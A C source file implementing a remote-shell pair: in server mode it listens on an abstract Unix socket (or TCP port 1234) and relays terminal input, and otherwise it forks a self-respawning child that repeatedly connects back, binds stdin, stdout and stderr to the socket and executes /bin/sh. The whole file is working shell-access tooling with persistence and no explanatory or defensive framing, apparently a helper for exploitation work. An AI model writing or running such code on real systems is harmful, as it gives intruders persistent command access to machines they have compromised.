#define _GNU_SOURCE
#include <dlfcn.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/in.h>
#include <linux/net.h>
#include <poll.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <sys/wait.h>

#define IP(a,b,c,d) (a|b<<8|c<<16|d<<24)

#define USE_UNIX

#ifdef USE_UNIX

#define UNIX_SOCKET_NAME	"unix_sock_test"

#else

#define ADDR		IP(127, 0, 0, 1)
#define ADDR_PORT	1234

#endif


static int create_socket(void)
{
	int s;

#ifdef USE_UNIX

	s = socket(AF_UNIX, SOCK_STREAM, 0);
	struct sockaddr_un addr;

	memset(&addr, 'x', sizeof(addr));
	addr.sun_family = AF_UNIX;
	addr.sun_path[0] = '\0';
	char pcSocketName[] = UNIX_SOCKET_NAME;
	strncpy(addr.sun_path+1, pcSocketName, strlen(pcSocketName));
#else
	struct sockaddr_in addr;
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == -1) {
		warn("socket");
		return -1;
	}
	int enable;
	enable = 1;
	if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)) == -1)
		warn("setsockopt(SO_REUSEADDR)");

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = __bswap_constant_16(ADDR_PORT);

#endif

	if (bind(s, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		warn("failed to bind socket on addr");
		close(s);
		return -1;
	}

	if (listen(s, 1) == -1) {
		warn("listen");
		close(s);
		return -1;
	}

	return s;
}

static int writeall(int fd, const void *buf, size_t count)
{
	const char *p;
	ssize_t i;

	p = buf;
	do {
		i = write(fd, p, count);
		if (i == 0) {
			return -1;
		} else if (i == -1) {
			if (errno == EINTR)
				continue;
			return -1;
		}
		count -= i;
		p += i;
	} while (count > 0);

	return 0;
}

void server(void) {
	struct sockaddr_in addr;
	struct pollfd fds[2];
	socklen_t addr_len;
	char buf[4096];
	nfds_t nfds;
	int c, n;
	int s;

	s = create_socket();

	fprintf(stderr, "waiting for connection...\n");

	addr_len = sizeof(addr);
	while (1) {
		c = accept(s, (struct sockaddr *)&addr,	&addr_len);
		if (c == -1) {
			if (errno == EINTR)
				continue;
			warn("accept");
			exit(-1);
		}
		break;
	}

	close(s);

	printf("accept from addr_len=%d\n", addr_len);

	fds[0].fd = STDIN_FILENO;
	fds[0].events = POLLIN;

	fds[1].fd = c;
	fds[1].events = POLLIN;

	nfds = 2;
	while (nfds > 0) {
		if (poll(fds, nfds, -1) == -1) {
			if (errno == EINTR)
				continue;
			warn("poll");
			break;
		}

		if (fds[0].revents & POLLIN) {
			n = read(STDIN_FILENO, buf, sizeof(buf));
			if (n == -1) {
				if (errno != EINTR) {
					warn("read(STDIN_FILENO)");
					break;
				}
			} else if (n == 0) {
				break;
			} else {
				writeall(c, buf, n);
			}
		}

		if (fds[1].revents & POLLHUP) {
			break;
		}

		if (fds[1].revents & POLLIN) {
			n = read(c, buf, sizeof(buf));
			if (n == -1) {
				if (errno != EINTR) {
					warn("read(c)");
					break;
				}
			} else if (n == 0) {
				break;
			} else {
				writeall(STDOUT_FILENO, buf, n);
			}
		}
	}
	exit(0);
}

int main(int argc, char **argv)
{
	int ret;
	int i;

	for(i = 0; i < argc; i++) {
		if(strstr(argv[i], "server") != 0) {
			fprintf(stderr, "server!\n");
			server();
		}
	}

	pid_t pid;

	pid = fork();

	if(pid != 0) {
		while(1) {
			int status;

			status = 0;

			if(wait4(pid, &status, 0, 0) != pid) continue;
			if(WIFEXITED(status)) {
				pid = fork();
				if (pid == 0) break;
			}
		}
	}

#ifdef USE_UNIX

	int sock = socket(AF_UNIX, SOCK_STREAM, 0);
	if (sock == -1) {
		perror(" socket create error!\n");
		return -1;
	}

	struct sockaddr_un serv_addr;

	memset(&serv_addr, 'x', sizeof(serv_addr));
	serv_addr.sun_family = AF_UNIX;
	serv_addr.sun_path[0] = '\0';
	//sizeof(pcSocketName) returns the size of 'char*' this is why I use strlen
	char pcSocketName[] = UNIX_SOCKET_NAME;
	strncpy(serv_addr.sun_path+1, pcSocketName, strlen(pcSocketName));

#else

	int sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1) {
		perror(" socket create error!\n");
		return -1;
	}

	struct sockaddr_in serv_addr = {0};

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = __bswap_constant_16(ADDR_PORT);
	serv_addr.sin_addr.s_addr = ADDR;

#endif

retry:

	ret = connect(sock, &serv_addr, sizeof(serv_addr));
	if (ret == -1)
	{
		perror("connect error!\n");
		struct timespec req = { .tv_sec = 1, .tv_nsec = 0 };

		nanosleep(&req, 0);
		goto retry;
	}

	dup3(sock, STDIN_FILENO, 0);
	dup3(sock, STDOUT_FILENO, 0);
	dup3(sock, STDERR_FILENO, 0);

#define SHELL_PATH	"/bin/sh"
	char argv1[] = SHELL_PATH;
	char *exec_argv[] = {
		argv1,
		NULL,
	};

	char envp1[] = "PATH=/usr/sbin:/usr/bin:/sbin:/bin";
	char *envp[] = {
		envp1,
		NULL,
	};
	ret = execve(SHELL_PATH, exec_argv, envp);
	return ret;
}